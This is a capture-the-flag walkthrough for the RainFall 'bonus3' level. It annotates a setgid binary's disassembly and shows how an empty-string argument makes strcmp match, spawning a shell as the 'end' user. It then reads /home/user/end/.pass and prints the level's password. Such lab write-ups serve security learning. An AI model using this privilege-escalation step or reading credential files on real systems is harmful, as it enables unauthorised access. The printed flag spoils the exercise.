# bonus3

## Hint

When we log into the machine as `bonus3`, we notice a binary:

```shell-session
bonus3@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 end users 5595 Mar  6  2016 bonus3
```

We notice that the `guid` bit is set, so the executable gets the rights of its group owners granted when it is executed, and conveniently enough the group in question is our target for the current level, a certain `end` user.

```shell-session
bonus3@RainFall:~$ ./bonus3 n

bonus3@RainFall:~$ ./bonus3
bonus3@RainFall:~$ ./bonus3 bonjour coucou
```

The binary accepts only one argument and prints a newline when one and only one is fed to it.

## gdb

### symbols & functions

A quick look at available symbols show that there are no custom global variables or functions.

### disas main

```gdb
gdb-peda$ disas main
Dump of assembler code for function main:
   0x080484f4 <+0>:	push   ebp
   0x080484f5 <+1>:	mov    ebp,esp
   0x080484f7 <+3>:	push   edi
   0x080484f8 <+4>:	push   ebx
   0x080484f9 <+5>:	and    esp,0xfffffff0
   0x080484fc <+8>:	sub    esp,0xa0                      <-- allocate 160 bytes
   0x08048502 <+14>:	mov    edx,0x80486f0                 <-- "r"
   0x08048507 <+19>:	mov    eax,0x80486f2                 <-- "/home/user/end/.pass"
   0x0804850c <+24>:	mov    DWORD PTR [esp+0x4],edx
   0x08048510 <+28>:	mov    DWORD PTR [esp],eax
   0x08048513 <+31>:	call   0x8048410 <fopen@plt>         <-- fopen("/home/user/end/.pass", "r")
   0x08048518 <+36>:	mov    DWORD PTR [esp+0x9c],eax      <-- store returned value in local var
   0x0804851f <+43>:	lea    ebx,[esp+0x18]                <-- load local buffer address
   0x08048523 <+47>:	mov    eax,0x0                       <-- feed 0 to bzero
   0x08048528 <+52>:	mov    edx,0x21                      <-- store 33
   0x0804852d <+57>:	mov    edi,ebx                       <-- feed 33 to bzero 
   0x0804852f <+59>:	mov    ecx,edx                       <-- feed local var buffer to bzero
   0x08048531 <+61>:	rep stos DWORD PTR es:[edi],eax      <-- bzero(buffer, 33)
   0x08048533 <+63>:	cmp    DWORD PTR [esp+0x9c],0x0      <-- compare local var with 0 (stream)
   0x0804853b <+71>:	je     0x8048543 <main+79>           <-- TRUE, go to +79
   0x0804853d <+73>:	cmp    DWORD PTR [ebp+0x8],0x2       <-- compare argc with 2
   0x08048541 <+77>:	je     0x804854d <main+89>           <-- TRUE, go to 79
   0x08048543 <+79>:	mov    eax,0xffffffff                <-- FALSE, put -1 in eax
   0x08048548 <+84>:	jmp    0x8048615 <main+289>          <-- go to +289 (return(-1))
   0x0804854d <+89>:	lea    eax,[esp+0x18]                <-- load local buffer address
   0x08048551 <+93>:	mov    edx,DWORD PTR [esp+0x9c]      <-- get address of local var 
   0x08048558 <+100>:	mov    DWORD PTR [esp+0xc],edx       <-- feed address to fread
   0x0804855c <+104>:	mov    DWORD PTR [esp+0x8],0x42      <-- feed 66 to fread
   0x08048564 <+112>:	mov    DWORD PTR [esp+0x4],0x1       <-- feed 1 to fread
   0x0804856c <+120>:	mov    DWORD PTR [esp],eax           <-- feed local buffer
   0x0804856f <+123>:	call   0x80483d0 <fread@plt>         <-- fread(buffer, 1, 66, stream)
   0x08048574 <+128>:	mov    BYTE PTR [esp+0x59],0x0
   0x08048579 <+133>:	mov    eax,DWORD PTR [ebp+0xc]       <-- get address of **argv
   0x0804857c <+136>:	add    eax,0x4                       <-- go to address pointing to *argv + 1
   0x0804857f <+139>:	mov    eax,DWORD PTR [eax]           <-- get address of argv[1]
   0x08048581 <+141>:	mov    DWORD PTR [esp],eax           <-- feed to atoi
   0x08048584 <+144>:	call   0x8048430 <atoi@plt>          <-- atoi(argv[1])
   0x08048589 <+149>:	mov    BYTE PTR [esp+eax*1+0x18],0x0 <-- put 0 at buffer[atoi(argv[1])]
   0x0804858e <+154>:	lea    eax,[esp+0x18]                <-- load address of buffer
   0x08048592 <+158>:	lea    edx,[eax+0x42]                <-- load address of another variable offset from buffer address (buff) 
   0x08048595 <+161>:	mov    eax,DWORD PTR [esp+0x9c]      <-- get stream var
   0x0804859c <+168>:	mov    DWORD PTR [esp+0xc],eax       <-- feed stream to fread
   0x080485a0 <+172>:	mov    DWORD PTR [esp+0x8],0x41      <-- feed 65 to fread
   0x080485a8 <+180>:	mov    DWORD PTR [esp+0x4],0x1       <-- feed 1 to fread
   0x080485b0 <+188>:	mov    DWORD PTR [esp],edx           <-- feed new buffer to fread
   0x080485b3 <+191>:	call   0x80483d0 <fread@plt>         <-- fread(buff, 1, 65, stream);
   0x080485b8 <+196>:	mov    eax,DWORD PTR [esp+0x9c]      <-- get stream address
   0x080485bf <+203>:	mov    DWORD PTR [esp],eax           <-- feed stream to fclose
   0x080485c2 <+206>:	call   0x80483c0 <fclose@plt>        <-- fclose(stream)
   0x080485c7 <+211>:	mov    eax,DWORD PTR [ebp+0xc]       <-- get address of **argv
   0x080485ca <+214>:	add    eax,0x4                       <-- go to address pointing to *argv + 1
   0x080485cd <+217>:	mov    eax,DWORD PTR [eax]           <-- get address of argv[1]
   0x080485cf <+219>:	mov    DWORD PTR [esp+0x4],eax       <-- feed argv[1] to strcmp
   0x080485d3 <+223>:	lea    eax,[esp+0x18]                <-- load address of local buffer
   0x080485d7 <+227>:	mov    DWORD PTR [esp],eax           <-- feed buffer to strcmp
   0x080485da <+230>:	call   0x80483b0 <strcmp@plt>          <-- strcmp(buffer, argv[1])
   0x080485df <+235>:	test   eax,eax                         <-- if strcmp == 0
   0x080485e1 <+237>:	jne    0x8048601 <main+269>            <-- TRUE, return 0
   0x080485e3 <+239>:	mov    DWORD PTR [esp+0x8],0x0         <-- feed 0 to execl
   0x080485eb <+247>:	mov    DWORD PTR [esp+0x4],0x8048707   <-- feed "sh" to execl
   0x080485f3 <+255>:	mov    DWORD PTR [esp],0x804870a       <-- feed "/bin/sh" to execl
   0x080485fa <+262>:	call   0x8048420 <execl@plt>           <-- execl("/bin/sh", "sh", 0)
   0x080485ff <+267>:	jmp    0x8048610 <main+284>            <-- go to +284 (return(0))
   0x08048601 <+269>:	lea    eax,[esp+0x18]
   0x08048605 <+273>:	add    eax,0x42
   0x08048608 <+276>:	mov    DWORD PTR [esp],eax
   0x0804860b <+279>:	call   0x80483e0 <puts@plt>
   0x08048610 <+284>:	mov    eax,0x0
   0x08048615 <+289>:	lea    esp,[ebp-0x8]
   0x08048618 <+292>:	pop    ebx
   0x08048619 <+293>:	pop    edi
   0x0804861a <+294>:	pop    ebp
   0x0804861b <+295>:	ret
End of assembler dump.
```

Here we can clearly see there is a comparison between a `buffer` and `argv[1]` with `strcmp()`.

Furthermore, we have control over what is both in the `buffer` and `argv[1]` because of the call to `atoi()` that sets a value at an index we give it.

Knowing that, if we input an empty string as `argv[1]`, `buffer[0]` will be equal to `0` and so will be `argv[1]`.

When we do that, we get a shell..

## Getflag

```shell-session
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```
